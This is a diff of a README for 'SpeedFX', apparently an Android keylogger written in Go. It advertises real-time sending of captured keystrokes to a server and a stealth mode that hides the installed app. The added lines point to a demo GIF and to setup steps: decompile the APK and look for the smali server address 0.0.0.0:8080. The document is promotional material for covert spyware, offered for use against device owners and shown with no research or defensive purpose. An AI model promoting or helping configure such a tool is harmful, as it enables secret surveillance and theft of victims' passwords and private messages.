@@ -2,6 +2,8 @@
 
 # Key Features of SpeedFX: [Visit for support](deVL33014)
 
+![Your GIF](https://github.com/ToolsForge/AndroidKeylogger/blob/main/Demo.gif)
+
 1. Real-Time Key Logs: **SpeedFX android keylogger** sends key logs in real-time, allowing you to monitor activity seamlessly. 
    
 2. Stealth Mode: Once installed, the SpeedFX APK hides itself, making it virtually Undetectable.
@@ -16,6 +18,10 @@
 
 ## Overview
 This repository contains a simple keylogger for Android devices developed in Go. It captures keyboard input and sends it to a server for analysis. Below are instructions for installing Go on both Windows and Termux, as well as running the Go server.
+
+## Setup APK
+Decompile apk
+Look for smali 0.0.0.0:8080
 
 ## Install Go on Windows
 1. Open your web browser and search for "install Go language on Windows".
